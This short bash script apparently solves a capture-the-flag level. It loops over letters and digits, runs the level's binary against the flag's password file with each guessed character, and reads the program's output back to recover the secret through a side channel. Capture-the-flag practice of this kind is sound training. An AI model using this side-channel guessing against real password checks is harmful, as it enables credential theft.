#!/bin/bash

for c in {A..Z} {a..z} {0..9}; do
echo $c
head -c35 file & sleep 0.1
/levels/level06 /home/the-flag/.password "$c"A 2> file
done